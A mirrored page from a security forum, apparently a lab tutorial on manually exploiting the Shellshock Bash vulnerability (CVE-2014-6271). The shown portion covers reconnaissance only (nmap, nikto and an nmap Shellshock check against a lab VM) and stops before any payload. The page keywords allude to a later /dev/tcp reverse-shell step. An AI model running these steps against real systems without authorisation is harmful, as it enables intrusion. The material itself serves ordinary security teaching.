@@ -1,0 +1,1523 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=6915&goto=nextoldest by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:21 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthread2237.html?t=6902" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthread23a9.html?t=6915&amp;goto=nextoldest";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Network Vulnerabiltity Assessment &amp; Penetration Testing - RSS Feed" href="externalec6c.php?type=RSS2&amp;forumids=10" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="linux, shellshock, 192.168.0.102, user-agent, root@kali~, vulnerability, vulnerable, server, command, /bin/bash, error, target, cve-2014-6271, shell, request, netcat, /cgi-bin/status, http/1.1, [any], result, nikto, finally, listening, 192.168.0.1011234, 2016-08-19, snip-----------------------------------------------------------------------, /dev/tcp/192.168.0.101/1234, bash-4.2$, machine, state, things, reverse, [192.168.0.101], running, complete, internal, http://192.168.0.102/cgi-bin/status, commands, accept/, manually, appears, variables, sending, required, console, connect, dav/2, exploit, exploitation, osvdb-112004" />
+	<meta name="description" content="Manually exploiting the shellshock vulnerability, so that you can get a complete picture about how the exploitation of shellshock works. 
+It has been given CVE-2014-6271. 
+The vulnerability is in Bourne Again Shell (BASH) which we call as shellshock also known as Bashdoor.Many services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized" />
+
+	<title> Manually exploiting shellshock Vulnerability</title>
+	<link rel="canonical" href="showthread2237.html?t=6902" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayfdc5.html?f=9">Hacking and Security Discussions</a></li>
+
+	<li class="navbit"><a href="forumdisplay15ca.html?f=10">Network Vulnerabiltity Assessment &amp; Penetration Testing</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> Manually exploiting shellshock Vulnerability</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=6915&goto=nextoldest by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:22:21 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 1 of 1
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthread2237.html?t=6902" title="Reload this Page">Manually exploiting shellshock Vulnerability</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthread2237.html?t=6902" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthread5bea.html?t=6902&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessaged6b5.html?do=sendtofriend&amp;t=6902"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscription947e.html?do=addsubscription&amp;t=6902" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="search7f20.html?search_type=1&amp;searchthreadid=6902&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="6902" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthreadffb1.html?t=6902&amp;p=14722&amp;mode=linear#post14722"> Switch to Linear Mode</a></li>
+						<li><a href="showthread9eeb.html?t=6902&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
+						<li><label>Threaded Mode</label></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 14722;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+pd[14722] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_14722">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">08-19-2016,&nbsp;<span class="time">05:32 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post14722" href="showthread.php?t=6902&amp;p=14722&amp;viewfull=1#post14722" class="postcounter">#1</a><a id="postcount14722" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=25682" title="mayank7651 is offline"><strong>mayank7651</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=25682" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=25682&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=25682" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=25682" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/25682-mayank7651" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="mayank7651 is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Newcomer\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_14722_25682" title="mayank7651 is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jun 2016</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>10</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					Manually exploiting shellshock Vulnerability\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_14722">\r\n						<blockquote class="postcontent restore ">\r\n							Manually exploiting the shellshock vulnerability, so that you can get a complete picture about how the exploitation of shellshock works.<br />\r\nIt has been given CVE-2014-6271.<br />\r\nThe vulnerability is in Bourne Again Shell (BASH) which we call as shellshock also known as Bashdoor.Many services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.<br />\r\nAt first we need to find cgi\'s that runs system commands and somehow display them to us, If you follow along you can get a good look at the curl too, because we are going to use it along the way.<br />\r\nTo find the cgi\'s , we can run the dirbuster/dirb/nikto and then  after finding all the cgi scripts we can crossverify via the nmap whether the vulnerability actually exists or not, yes the vulnerability is so critical that it has got a nmap nse script for it. <br />\r\nI have setup a vm for this in my virtual lab to demonstrate this.<br />\r\nAs usual first we scan the target via nmap(we can do the check here itself, but we\'ll not we will follow along)<br />\r\n<br />\r\nRunning nmap:<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:204px;">root@kali:~# nmap 192.168.0.102 -sV -O -sT \r\n\r\nStarting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 14:59 IST\r\nNmap scan report for 192.168.0.102\r\nHost is up (0.00051s latency).\r\nNot shown: 998 closed ports\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)\r\n80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)\r\nMAC Address: 00:0C:29:19:F6:5E (VMware)\r\nDevice type: general purpose\r\nRunning: Linux 3.X|4.X\r\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\r\nOS details: Linux 3.2 - 4.0\r\nNetwork Distance: 1 hop</pre>\r\n</div>now we know what are all the ports open we can run nikto now on port 80 to get a feel what is the scene here.<br />\r\n <br />\r\nRunning nikto:-<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:216px;">root@kali:~# nikto -host 192.168.0.102\r\n- Nikto v2.1.6\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\r\n+ Target IP:          192.168.0.102\r\n+ Target Hostname:    192.168.0.102\r\n+ Target Port:        80\r\n+ Start Time:         2016-08-19 15:16:56 (GMT5.5)\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-snip-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\r\n+ Uncommon header \'nikto-added-cve-2014-6278\' found, with contents: true\r\n+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the \'shellshock\' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).\r\n+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the \'shellshock\' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-snip-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\r\n+ End Time:           2016-08-19 15:17:22 (GMT5.5) (26 seconds)\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-\r\n+ 1 host(s) tested</pre>\r\n</div>Now you can see in the result  that it shows &quot;/cgi-bin/status&quot; is shellshock vulnerable.<br />\r\n<br />\r\nwe will cross verify the result with the nmap.<br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:204px;">root@kali:~# nmap 192.168.0.102 -p 80 -' + '-script=http-shellshock -' + '-script-args uri=/cgi-bin/status\r\n\r\nStarting Nmap 7.01 ( https://nmap.org ) at 2016-08-19 15:23 IST\r\nNmap scan report for 192.168.0.102\r\nHost is up (0.00046s latency).\r\nPORT   STATE SERVICE\r\n80/tcp open  http\r\n| http-shellshock: \r\n|   VULNERABLE:\r\n|   HTTP Shellshock vulnerability\r\n|     State: VULNERABLE (Exploitable)\r\n|     IDs:  CVE:CVE-2014-6271\r\n|       This web application might be affected by the vulnerability known as Shellshock. It seems the server\r\n|       is executing commands injected via malicious HTTP headers.\r\n-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + '-' + 